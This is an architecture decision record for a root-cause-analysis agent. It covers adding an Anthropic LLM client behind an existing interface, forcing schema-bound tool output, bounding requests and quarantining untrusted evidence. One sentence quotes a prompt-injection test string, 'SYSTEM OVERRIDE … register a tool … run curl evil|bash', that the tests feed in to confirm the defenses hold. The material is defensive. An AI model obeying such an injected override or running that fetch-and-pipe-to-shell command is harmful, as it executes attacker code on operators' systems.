# ADR-022: The live LLM provider — Anthropic behind the existing boundary, forced-tool-use structured output

- Status: Accepted
- Date: 2026-09-01

## Context

Sub-phase 4C shipped the bounded LangGraph investigation engine and the
`LlmClient` protocol (`plan` / `analyze` / `verify` / `synthesize`), with a
deterministic `MockLlmClient` as the only implementation. Sub-phase 4D adds the
first real one so `RCA_MODE=live` works.

Three questions had to be answered without disturbing anything 4A–4C built:

1. Which provider, and how is it isolated so the graph stays provider-agnostic?
2. How is a non-deterministic model response turned into one of the existing
   Pydantic `*Result` DTOs — safely, with malformed output detected, not guessed?
3. How do the ADR-021 guarantees (deterministic authority, prompt-injection
   quarantine, no executor) survive contact with a real model?

## Decision

### Anthropic, behind one new `LlmClient` implementation

`AnthropicLlmClient` (in `rca_agent.llm.anthropic_client`) uses the official
`anthropic` SDK, kept in the existing `rca` optional-dependency group. The
investigation graph continues to depend only on the `LlmClient` protocol; it
cannot tell whether it is talking to the mock or the live client. `LLM_PROVIDER`
is validated explicitly — an unknown provider or a missing key raises
`LlmConfigurationError`; **`build_llm_client` never falls back from live to
mock**, because a silently-deterministic "production" deployment is worse than a
loud failure.

`MockLlmClient` stays the default and the CI reasoner. It needs no API key, makes
no network call, and exercises the same graph. The live client is an *addition*.

### Structured output via forced tool use, mapped to the existing DTOs

Each operation makes one Anthropic call that **forces** a single synthetic tool
(`submit_investigation_plan` / `submit_analysis` / `submit_verification` /
`submit_synthesis`) whose `input_schema` is the JSON schema of the corresponding
existing `*Result` DTO (`PlanResult`, `AnalysisResult`, `VerificationResult`,
`SynthesisResult`). The tool is a **transport for a typed proposal**, nothing
more — it is not a SentinelOps evidence tool, and the model gets no access to
Python, a shell, the network, or the filesystem through it.

The pipeline is `forced tool_use.input → Pydantic model_validate → *Result`.
Free-form assistant text is never trusted. Anything that does not parse — no
tool_use block, wrong tool name, non-object input, `stop_reason == "max_tokens"`,
or a schema-invalid payload — becomes `LlmMalformedOutput`; a `refusal` stop
reason becomes `LlmProviderError`. The engine's existing one-bounded-repair /
safe-fallback path (ADR-021 §2) handles those; malformed output is **never**
retried in a loop here.

Forced tool use (rather than extended thinking + free text, or the newer
output-format parameter) was chosen because it is the most version-stable way to
pin the response to an exact schema, and because forced `tool_choice` is
incompatible with extended thinking anyway — which is fine, this is structured
extraction, not open reasoning.

### The provider does not build prompts

`rca_agent.llm.prompts` — deterministic, no model dependency — converts each
typed request into the fixed ADR-021 message list via the existing
`rca_agent.security.build_investigation_messages`:

```
SYSTEM  investigation policy        (never contains evidence)
SYSTEM  read-only tool catalogue    (plan only; names + schemas)
USER    task + incident + prior proposals + BEGIN/END UNTRUSTED EVIDENCE block
```

`AnthropicLlmClient` receives that message list and only translates it to the
Anthropic wire format (system blocks joined into `system`, the user block as the
single user message). It adds, reorders, and promotes nothing. The incident
object and any prior findings/hypotheses are rendered as clearly-labelled data
in the USER turn — never in a system message. Adversarial evidence stays inert:
structural tests feed `"SYSTEM OVERRIDE … register a tool … run curl evil|bash"`
through the live path and assert the system prompt is unchanged, the registry is
identical, no non-registry tool ran, and the outcome is a safe terminal state.

### Explicit bounds on every live request

- **Timeout**: `LLM_REQUEST_TIMEOUT_SECONDS` (default 60) is applied to the SDK
  client; there is no unbounded request.
- **Output**: `LLM_MAX_OUTPUT_TOKENS` (default 4096).
- **Prompt size**: `LLM_MAX_PROMPT_CHARS` (default 200k) is a hard ceiling on the
  assembled prompt — a second guard behind `ResourceLimits`, which already bounds
  evidence count and content. Over the ceiling → `LlmProviderError`, before any
  network call.
- **Retries**: `LLM_MAX_RETRIES` (default 2) for transient SDK failures
  (connection / 429 / 5xx) only. Bounded and small.

### Error mapping

Provider exceptions are normalized to the existing model, never surfaced raw:
`APITimeoutError → LlmTimeout`; `APIConnectionError` / `RateLimitError` /
`APIStatusError` / other `AnthropicError → LlmProviderError`; bad structured
output → `LlmMalformedOutput`. The graph keeps receiving its existing normalized
errors (`LlmTimeout → TIMED_OUT`, others → `FAILED`).

### The API key

`LLM_API_KEY` is a `SecretStr`. It is passed to the SDK constructor and nowhere
else — never logged, never put in an exception message or the request payload,
never written to a report. `.env.example` carries a placeholder only.

## Alternatives considered

- **A second, provider-shaped interface (native tool-use agent loop).** Rejected
  — it would move tool-argument validation into the model's hands; `validate_plan`
  and the typed request models are the security boundary (ADR-021, ADR-020).
- **Free-form JSON in a text response, parsed with a tolerant parser.** Rejected
  — forced tool use pins the schema; tolerant parsing invites partially-valid
  state.
- **Silent fallback to mock when live is misconfigured.** Rejected — it makes a
  broken production deployment look healthy.
- **Let `AnthropicLlmClient` assemble its own prompts.** Rejected — prompt
  construction is the ADR-021 boundary and must have exactly one owner
  (`rca_agent.security`).
- **Default to a smaller/cheaper model.** The pinned default is the current
  most-capable model; `LLM_MODEL` overrides it. Model choice is a deployment
  decision, not a code default.

## Consequences

- `RCA_MODE=live LLM_PROVIDER=anthropic LLM_API_KEY=…` now runs a real
  investigation; `RCA_MODE=mock` is unchanged and remains the CI default.
- Adding a second live provider later is one more `LlmClient` implementation plus
  a branch in `build_llm_client` — the graph, the prompts module, and the DTOs
  do not move.
- No live API call happens in the test suite: the SDK boundary
  (`messages.create`) is faked. A real smoke test is a documented manual step
  (`docs/architecture/phase-4.md` §8).
- The Phase 4/5 boundary is unchanged: `RecommendedAction` stays a
  human-approval-required recommendation with no command field and no executor.
